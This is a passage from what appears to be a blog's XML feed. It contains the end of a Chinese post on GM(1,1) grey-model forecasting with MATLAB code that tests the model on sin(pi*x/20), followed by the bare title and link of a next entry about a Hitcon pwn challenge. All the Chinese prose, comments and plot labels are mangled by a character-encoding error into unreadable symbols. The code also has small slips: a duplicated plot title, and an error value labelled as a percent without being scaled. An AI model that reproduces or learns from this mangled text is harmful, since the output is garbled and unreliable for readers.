rel="noopener">ÈîÄÂîÆÈáè</a>‰∫íÁõ∏Âà∂Á∫¶ÁöÑÈ¢ÑÊµã„ÄÇ</p><p>6„ÄÅÂåÖÁªúÁÅ∞È¢ÑÊµã„ÄÇÂØπ‰∫éÈöæ‰ª•Áî®Êï∞ÂàóÈ¢ÑÊµãÊàñÁÅæÂèòÈ¢ÑÊµãÂ§ÑÁêÜÔºå‰πü‰∏çÂøÖÁî®ÊãìÊâëÈ¢ÑÊµãËÆ°ÁÆóÁöÑÁ¶ª‰π±Â∫èÂàóÔºåÂèØ‰ª•ÊûÑÈÄ†‰∏äËæπÁïå GM(1Ôºå1) ‰∏é‰∏ãËæπÁïå GM(1Ôºå1) ËøõË°åË¶ÜÁõñÔºåËøôÁßçËæπÁïåÊ®°ÂûãÂç≥ÂåÖÁªúÊ®°Âûã„ÄÇ</p></blockquote><h2 id="ÁÅ∞Ëâ≤Ê®°ÂûãÊµãËØï"><a href="#ÁÅ∞Ëâ≤Ê®°ÂûãÊµãËØï" class="headerlink" title="ÁÅ∞Ëâ≤Ê®°ÂûãÊµãËØï"></a>ÁÅ∞Ëâ≤Ê®°ÂûãÊµãËØï</h2><p>‰ª•sin(pi*x/20)ÂáΩÊï∞‰∏∫‰æãÔºå‰ª•ÂçïË∞ÉÊÄß‰∏∫Âå∫Èó¥Ê£ÄÈ™åÁÅ∞Ëâ≤Ê®°ÂûãÈ¢ÑÊµãÁöÑÁ≤æÂ∫¶ „ÄÇ</p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%ÊëòËá™Angel_kittyÂ∏àÂÇÖÁöÑmatlabÁ®ãÂ∫è‰ª£Á†Å</span>clcclear all<span class="token comment" spellcheck="true">% Êú¨Á®ãÂ∫è‰∏ªË¶ÅÁî®Êù•ËÆ°ÁÆóÊ†πÊçÆÁÅ∞Ëâ≤ÁêÜËÆ∫Âª∫Á´ãÁöÑÊ®°ÂûãÁöÑÈ¢ÑÊµãÂÄº„ÄÇ</span><span class="token comment" spellcheck="true">% Â∫îÁî®ÁöÑÊï∞Â≠¶Ê®°ÂûãÊòØ GM(1,1)„ÄÇ</span><span class="token comment" spellcheck="true">% ÂéüÂßãÊï∞ÊçÆÁöÑÂ§ÑÁêÜÊñπÊ≥ïÊòØ‰∏ÄÊ¨°Á¥ØÂä†Ê≥ï„ÄÇ</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>yy<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    <span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT<span class="token operator">=</span>B<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token number">-1</span>    <span class="token function">YN</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN<span class="token operator">=</span>YN<span class="token operator">'</span><span class="token punctuation">;</span>A<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT<span class="token operator">*</span>B<span class="token punctuation">)</span><span class="token operator">*</span>BT<span class="token operator">*</span>YN<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t<span class="token operator">=</span>u<span class="token operator">/</span>a<span class="token punctuation">;</span>t_test<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%ÈúÄË¶ÅÈ¢ÑÊµã‰∏™Êï∞</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test<span class="token operator">+</span>n<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n<span class="token operator">+</span>t_test<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token punctuation">;</span>xs<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">;</span>yn<span class="token operator">=</span><span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">;</span>det<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    det<span class="token operator">=</span>det<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det<span class="token operator">=</span>det<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs<span class="token punctuation">,</span>yn<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'ÂçïË∞ÉÈÄíÂ¢û'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'ÂÆûÊµãÂÄº'</span><span class="token punctuation">,</span><span class="token string">'È¢ÑÊµãÂÄº'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ÁôæÂàÜÁªùÂØπËØØÂ∑Æ‰∏∫Ôºö'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'È¢ÑÊµãÂÄº‰∏∫Ôºö '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%ÈÄíÂáè</span>y1<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x1<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n1<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">;</span>yy1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    <span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT1<span class="token operator">=</span>B1<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token number">-1</span>    <span class="token function">YN1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN1<span class="token operator">=</span>YN1<span class="token operator">'</span><span class="token punctuation">;</span>A1<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT1<span class="token operator">*</span>B1<span class="token punctuation">)</span><span class="token operator">*</span>BT1<span class="token operator">*</span>YN1<span class="token punctuation">;</span>a1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token operator">=</span>u1<span class="token operator">/</span>a1<span class="token punctuation">;</span>t_test1<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%ÈúÄË¶ÅÈ¢ÑÊµã‰∏™Êï∞</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test1<span class="token operator">+</span>n1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a1<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n1<span class="token operator">+</span>t_test1<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x21<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token punctuation">;</span>xs1<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">;</span>yn1<span class="token operator">=</span><span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">;</span>det1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    det1<span class="token operator">=</span>det1<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det1<span class="token operator">=</span>det1<span class="token operator">/</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs1<span class="token punctuation">,</span>yn1<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'ÂçïË∞ÉÈÄíÂ¢û'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'ÂÆûÊµãÂÄº'</span><span class="token punctuation">,</span><span class="token string">'È¢ÑÊµãÂÄº'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ÁôæÂàÜÁªùÂØπËØØÂ∑Æ‰∏∫Ôºö'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'È¢ÑÊµãÂÄº‰∏∫Ôºö '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys1</span><span class="token punctuation">(</span>n1<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%Êï¥‰∏™Âå∫Èó¥</span>y2<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x2<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n2<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>yy2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    <span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT2<span class="token operator">=</span>B2<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token number">-1</span>    <span class="token function">YN2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN2<span class="token operator">=</span>YN2<span class="token operator">'</span><span class="token punctuation">;</span>A2<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT2<span class="token operator">*</span>B2<span class="token punctuation">)</span><span class="token operator">*</span>BT2<span class="token operator">*</span>YN2<span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>u2<span class="token operator">/</span>a2<span class="token punctuation">;</span>t_test2<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%ÈúÄË¶ÅÈ¢ÑÊµã‰∏™Êï∞</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test2<span class="token operator">+</span>n2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t2<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a2<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n2<span class="token operator">+</span>t_test2<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x22<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token punctuation">;</span>xs2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">;</span>yn2<span class="token operator">=</span><span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">;</span>det2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    det2<span class="token operator">=</span>det2<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det2<span class="token operator">=</span>det2<span class="token operator">/</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs2<span class="token punctuation">,</span>yn2<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'ÂÖ®Âå∫Èó¥'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'ÂÆûÊµãÂÄº'</span><span class="token punctuation">,</span><span class="token string">'È¢ÑÊµãÂÄº'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ÁôæÂàÜÁªùÂØπËØØÂ∑Æ‰∏∫Ôºö'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'È¢ÑÊµãÂÄº‰∏∫Ôºö '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys2</span><span class="token punctuation">(</span>n2<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ÂéüËøêË°åÊïàÊûúÔºö</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e4f895b1.png" alt=""></p><p>Â∞ÜÂáΩÊï∞Êîπ‰∏∫ y = sin(x) ÂêéÂèëÁé∞È¢ÑÊµãÊïàÊûú‰∏çÂ§ßÔºåËøôÊòØÂõ†‰∏∫ÁÅ∞Ëâ≤È¢ÑÊµãÊØîËæÉÈÄÇÁî®‰∫éÂçïË∞ÉÂáΩÊï∞ËÄåÈùûÊ≥¢Âä®ÊÄßÊØîËæÉÂ§ßÁöÑÂáΩÊï∞ÔºåÂõ†‰∏∫ËøôÁßçÊ≥¢Âä®‰ºöË¢´ËßÜ‰∏∫Âπ≤Êâ∞Ê∂àÈô§„ÄÇ</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e005249b.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> ÁÆóÊ≥ï </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ÁÆóÊ≥ï </tag>
            
            <tag> Êï∞Â≠¶Ê®°Âûã </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà26-Hitcon-Âõõ</title>
      <link href="/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
